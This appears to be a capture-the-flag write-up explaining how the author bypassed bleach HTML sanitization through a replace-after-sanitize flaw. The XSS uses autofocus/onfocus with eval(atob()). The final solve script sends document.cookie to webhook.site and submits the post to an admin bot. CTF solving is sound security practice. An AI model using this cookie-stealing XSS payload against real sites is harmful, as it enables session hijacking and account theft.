---
created: 2026-03-14T01:56
updated: 2026-03-15T01:15
points: 182
solves: 26
---

The challenge can be boiled down to this XSS attack:

```python
import bleach
def sanitize_text(text: str) -> str:
    return bleach.clean(text, tags=[], attributes={}, strip=True)

def linkify_text(text: str) -> str:
    return bleach.linkify(text)
name = """
CANT BE MORE THAN 20 CHARACTERS
""".strip()
print(len(name))
body = """
SOMETHING
""".strip()
name = sanitize_text(name.strip())
content = body.replace("[name]", "[name] ")
sanitized = sanitize_text(content)
linkified = linkify_text(sanitized)
rendered = linkified.replace("[name]", name)

print(rendered)
```

`sanitize_text` removes all tags and attributes, while `linkify_text` generates links from URLs.

This is fine but there is a replace-after-sanitization step.

This is my first attempt, it works but requires you to click the link:

```python
name = """
" onclick="alert(1)
""".strip()

body = """
https://www.youtube.com/watch?v=dQw4w9WgXcQ[name]
""".strip()
```

The bot does click stuff but I don't think it will work.

```js
await page.goto(targetUrl, { waitUntil: "networkidle2", timeout: 5000 });
await page.waitForSelector("input[name='name']", { timeout: 3000 });
await page.click("input[name='name']", { clickCount: 3 });
await page.keyboard.type(name, { delay: 10 });
await page.click("button[type='submit']");
await new Promise((resolve) => setTimeout(resolve, 1000));
await browser.close();
```

So I need to trigger the XSS without clicking. I can do this by using an `autofocus` attribute on an element, which will trigger the `onfocus` event when the page loads.

```html
<a href="https://x.com/aa" autofocus onfocus="PAYLOAD"></a>
```

But now there is a problem, `autofocus` and `onfocus` combined is already close to 20 characters.

`len('"autofocus onfocus="') == 20`

I need to put my real payload in `body`.

There is another problem, spaces can't exist in urls so everything after `[name]` will not be part of the url. Because of `body.replace("[name]", "[name] ")`

```html
"autofocus onfocus=
https://x.com/aa[name]bb

<a href="https://x.com/aa"autofocus onfocus=" rel="nofollow">https://x.com/aa"autofocus onfocus=</a> bb
```

I thought about how "all tags and attributes" are removed, so I could take advantage of that by just using `[name<img/>]`.

And with this my payload is actually simpler.

```html
"   <!-- yes default name is just 1 quote -->
https://x.com/aa[name<img/>]autofocus=''onfocus='alert(1)'
<a href="https://x.com/aa"autofocus=''onfocus='alert(1)'" rel="nofollow">https://x.com/aa"autofocus=''onfocus='alert(1)'</a>
```

Now I run into another problem, I've already used both quotes and tick mark don't seem to be allowed in urls, I need some way to put my payload in the `onfocus` attribute without using quotes.

I quickly realize that I can use `eval` and `atob` to execute code that is in another attribute, which allows me to use base64 encoding to bypass the quote problem.

And we have the solve.

```python
import base64
import requests
import bleach

def sanitize_text(text: str) -> str:
    return bleach.clean(text, tags=[], attributes={}, strip=True)

def linkify_text(text: str) -> str:
    return bleach.linkify(text)

target = "http://localhost:5000"
name = """
"
""".strip()

print(len(name))

payload = """
fetch("https://webhook.site/?"+document.cookie)
"""

body = """
https://x.com/aa[name<img/>]autofocus=''onfocus='eval(atob(this.attributes[3].value))'payload='BASE64'
""".strip().replace("BASE64", base64.b64encode(payload.encode()).decode())

name = sanitize_text(name.strip())
content = body.replace("[name]", "[name] ")
sanitized = sanitize_text(content)
linkified = linkify_text(sanitized)
rendered = linkified.replace("[name]", name)
print(rendered)
p = requests.post(target + "/submit", data={
    "title": "test",
    "content": body,
    "default_name": name
}).url

print(p)

pid = int(p.split("/")[-1])
print(f"{pid=}")

print(requests.post(target + "/report", data={
    "id": pid
}).text)
```

```flag
tkbctf{https://www.youtube.com/watch?v=Bg0yQtrqR_A}
```
